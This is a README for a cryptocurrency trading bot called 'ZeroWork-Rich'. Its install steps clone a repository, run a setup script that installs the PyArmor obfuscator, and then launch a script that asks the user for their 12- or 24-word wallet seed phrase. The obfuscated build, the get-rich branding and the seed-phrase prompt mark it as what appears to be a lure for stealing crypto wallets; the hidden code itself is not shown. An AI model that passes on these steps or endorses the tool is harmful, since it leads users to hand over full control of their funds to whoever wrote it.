# ZeroWork-Rich Trading Bot

Multi-chain automated cryptocurrency trading bot.

## Installation

```bash
git clone https://github.com/goosyteam-del/ZeroWork-Rich.git
cd ZeroWork-Rich
chmod +x setup.sh
./setup.sh
```

Setup will automatically:
- Install dependencies
- Install PyArmor
- Rebuild for your platform (Linux)

## Run

```bash
python3 ZeroWorkRich.py
```

Enter your 12 or 24-word seed phrase when prompted.

## Requirements

- Python 3.9+
- Linux/Ubuntu
